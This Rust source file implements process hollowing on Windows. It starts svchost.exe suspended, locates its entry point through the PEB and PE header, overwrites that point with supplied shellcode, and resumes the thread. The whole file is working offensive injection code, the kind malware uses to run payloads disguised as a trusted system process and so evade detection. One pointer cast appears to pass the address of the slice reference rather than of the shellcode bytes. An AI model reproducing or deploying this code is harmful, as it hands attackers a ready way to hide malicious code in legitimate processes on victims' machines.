extern crate windows;
use std::{mem, ptr};
use std::ffi::{CString, c_void};
use windows::Win32::Foundation::PSTR;
use windows::Win32::Security::SECURITY_ATTRIBUTES;
use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
use windows::Win32::System::Threading::{CreateProcessA, CREATE_SUSPENDED, NtQueryInformationProcess, PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION, ResumeThread, STARTUPINFOA};
use std::{thread, time};

const POINTER_SIZE: usize = mem::size_of::<&u8>();
const POINTER_SIZE_TIMES_SIX: u32 = POINTER_SIZE as u32 * 6;

pub fn hollow_and_run(shellcode: &[u8]) {
    let sleep_timer = time::Duration::from_millis(3000);
    // Create empty StartupInfoA struct for use in CreateProcess
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfow
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/struct.STARTUPINFOW.html
    let startup_info: STARTUPINFOA = unsafe { mem::zeroed() };

    // Create empty ProcessInformation struct for use in CreateProcess
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/struct.PROCESS_INFORMATION.html
    let mut process_information: PROCESS_INFORMATION = unsafe { mem::zeroed() };

    // Use CreateProcessW to create a suspended process that will be hollowed out for the shellcode
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.CreateProcessW.html
    let lp_application_name: PSTR = unsafe { mem::zeroed() };
    let mut lp_command_line: PSTR = unsafe { mem::zeroed() };
    lp_command_line.0 = CString::new("C:\\Windows\\System32\\svchost.exe").unwrap().into_raw() as *mut u8;
    let lp_process_attributes: SECURITY_ATTRIBUTES = unsafe { mem::zeroed() };
    let lp_thread_attributes: SECURITY_ATTRIBUTES = unsafe { mem::zeroed() };
    let lp_environment: c_void = unsafe { mem::zeroed() };
    let lp_current_directory: PSTR = unsafe { mem::zeroed() };
    let creation_result = unsafe { CreateProcessA(
        lp_application_name,
        lp_command_line,
        &lp_process_attributes,
        &lp_thread_attributes,
        false,
        CREATE_SUSPENDED,
        &lp_environment,
        &lp_current_directory,
        &startup_info,
        &mut process_information) };

    if !creation_result.as_bool() {
        panic!("Could not create the suspended process with CreateProcessA");
    }

    let pid = process_information.dwProcessId;
    println!("Process created, and its PID is {pid:?}");
    thread::sleep(sleep_timer);

    // Create empty PROCESS_BASIC_INFORMATION struct for use in ZwQueryInformationProcess
    // WINDOWS --> https://www.pinvoke.net/default.aspx/Structures/PROCESS_BASIC_INFORMATION.html
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/struct.PROCESS_BASIC_INFORMATION.html
    let process_handle = process_information.hProcess;
    let mut basic_information: PROCESS_BASIC_INFORMATION = unsafe { mem::zeroed() };
    let basic_info_as_c_void = &mut basic_information as *mut _ as *mut c_void;
    
    // Get the PEB base address of the suspended process with ZwQueryInformationProcess
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.NtQueryInformationProcess.html
    if let Err(error) = unsafe { NtQueryInformationProcess(process_handle, 0, basic_info_as_c_void, POINTER_SIZE_TIMES_SIX, ptr::null_mut()) } {
        panic!("Could not get the entry point with ZwQueryInformationProcess: {error}");
    }

    let peb = basic_information.PebBaseAddress as u64;
    let uni_pid = basic_information.UniqueProcessId;
    println!("Got the PEB, address {peb} and unique pid {uni_pid}");
    thread::sleep(sleep_timer);

    // Use ReadProcessMemory to read 8 bytes of memory; the address of the code base
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/Debug/fn.ReadProcessMemory.html
    let image_base = basic_information.PebBaseAddress as u64 + 0x10;
    let image_base_c_void = image_base as *const c_void;
    let mut address_buffer = [0; POINTER_SIZE];
    let address_buffer_c_void = &mut address_buffer as *mut _ as *mut c_void;
    let read_result = unsafe { ReadProcessMemory(process_handle, image_base_c_void, address_buffer_c_void, address_buffer.len(), ptr::null_mut()) };

    if !read_result.as_bool() {
        panic!("Could not read the address of the code base with ReadProcessMemory");
    }

    let res = read_result.as_bool();
    println!("We read the 8 bytes because read result was {res}");
    println!("The buffer is {address_buffer:?}");
    thread::sleep(sleep_timer);

    // Use ReadProcessMemory again to read 512 bytes of memory; the PE header
    let svchost_base = rco_utils::array_to_u64_lit_end(&address_buffer);
    let svchost_base_c_void = svchost_base as *const c_void;
    let mut header_buffer = [0; 0x200];
    let header_buffer_c_void = &mut header_buffer as *mut _ as *mut c_void;
    let read_result = unsafe { ReadProcessMemory(process_handle, svchost_base_c_void, header_buffer_c_void, header_buffer.len(), ptr::null_mut()) };

    println!("read result is {read_result:?}");
    thread::sleep(sleep_timer);

    if !read_result.as_bool() {
        panic!("Could not read the PE header with ReadProcessMemory");
    }

    println!("svchost base is {svchost_base}");
    let resb = read_result.as_bool();
    println!("We read the 512 bytes because the new read result was {resb}");
    println!("The buffer is {header_buffer:?}");
    thread::sleep(sleep_timer);

    // Write the shellcode to the suspended process with WriteProcessMemory
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/Debug/fn.WriteProcessMemory.html
    let e_lfanew_offset = rco_utils::array_to_u32_lit_end(header_buffer[0x3C..0x40].try_into().unwrap());
    println!("elf offset {e_lfanew_offset}");
    thread::sleep(sleep_timer);
    let opthdr: usize = (e_lfanew_offset + 0x28).try_into().unwrap();
    println!("opthdr {opthdr}");
    thread::sleep(sleep_timer);
    let entry_point_rva = rco_utils::array_to_u32_lit_end(&header_buffer[opthdr..opthdr + 0x04].try_into().unwrap());
    println!("entry point {entry_point_rva}");
    thread::sleep(sleep_timer);
    let address_of_entry_point = entry_point_rva as u64 + svchost_base;
    let address_of_entry_point_c_void = address_of_entry_point as *const c_void;
    let shellcode_c_void = & shellcode as *const _ as *const c_void;
    let write_result = unsafe { WriteProcessMemory(process_handle, address_of_entry_point_c_void, shellcode_c_void, shellcode.len(), ptr::null_mut()) };

    if !write_result.as_bool() {
        panic!("Could not write the shellcode to the suspended process with WriteProcessMemory");
    }

    let resc = write_result.as_bool();
    println!("We wrote the bytes because the write result was {resc}");
    thread::sleep(sleep_timer);

    // Start it back up with ResumeThread
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.ResumeThread.html
    let res_result = unsafe { ResumeThread(process_information.hThread) };
    println!("Resume result was {res_result}");
    thread::sleep(sleep_timer);
}